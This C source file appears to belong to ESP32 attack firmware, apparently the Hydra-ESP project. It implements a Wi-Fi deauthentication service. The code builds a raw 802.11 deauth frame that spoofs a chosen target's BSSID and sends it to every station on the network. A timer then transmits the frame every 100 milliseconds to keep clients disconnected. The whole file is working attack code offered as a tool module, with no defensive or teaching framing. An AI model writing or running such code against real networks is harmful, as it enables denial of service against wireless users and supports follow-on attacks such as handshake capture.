#include "svc_deauth.h"
#include "svc_target.h"
#include "svc_wifi.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"
#include "esp_log.h"
#include <string.h>

static const char *TAG = "svc_deauth";

static esp_timer_handle_t s_timer = NULL;
static uint8_t s_bssid[6];
static volatile uint32_t s_frames = 0;
static volatile int s_tx_err = 0;      /* first TX error since start */
static volatile int s_tx_errcode = 0;

#define DEAUTH_PERIOD_US 100000 /* Hydra-ESP broadcast cadence */

/* Raw deauth template (Hydra-ESP wsl_bypasser deauth_frame_default):
 * FC c0 00 (MGMT/deauth), duration, dst broadcast, src+bssid patched,
 * seq f0 ff, reason 0x0002. */
static void build_deauth(uint8_t *f, const uint8_t bssid[6]) {
    static const uint8_t tpl[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x02, 0x00,
    };
    memcpy(f, tpl, sizeof(tpl));
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
}

static void tx_tick(void *arg) {
    (void)arg;
    uint8_t f[26];
    build_deauth(f, s_bssid);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
    if (err == ESP_OK) {
        s_frames++;
    } else if (s_frames == 0 && !s_tx_err) {
        s_tx_err = 1;
        s_tx_errcode = (int)err;
        ESP_LOGW(TAG, "tx failed: %s", esp_err_to_name(err));
    }
}

int svc_deauth_start(void) {
    if (s_timer)
        return 0;
    if (!tgt_wifi_has())
        return -1;
    if (svc_wifi_init() != 0)
        return -2;
    esp_wifi_set_ps(WIFI_PS_NONE);
    int ch = tgt_wifi_channel();
    if (ch < 1)
        ch = 1;
    if (ch > 13)
        ch = 13;
    if (esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE) != ESP_OK)
        return -3;
    memcpy(s_bssid, tgt_wifi_bssid(), 6);
    s_frames = 0;
    s_tx_err = 0;
    s_tx_errcode = 0;
    esp_timer_create_args_t a = {
        .callback = tx_tick,
        .name = "deauth",
    };
    if (esp_timer_create(&a, &s_timer) != ESP_OK) {
        s_timer = NULL;
        return -4;
    }
    if (esp_timer_start_periodic(s_timer, DEAUTH_PERIOD_US) != ESP_OK) {
        esp_timer_delete(s_timer);
        s_timer = NULL;
        return -5;
    }
    ESP_LOGI(TAG, "running, ch %d", ch);
    return 0;
}

void svc_deauth_stop(void) {
    if (!s_timer)
        return;
    esp_timer_stop(s_timer);
    esp_timer_delete(s_timer);
    s_timer = NULL;
    ESP_LOGI(TAG, "stopped, %lu frames", (unsigned long)s_frames);
}

int svc_deauth_running(void) { return s_timer != NULL; }

uint32_t svc_deauth_frames(void) { return s_frames; }

int svc_deauth_tx_error(void) { return s_tx_errcode; }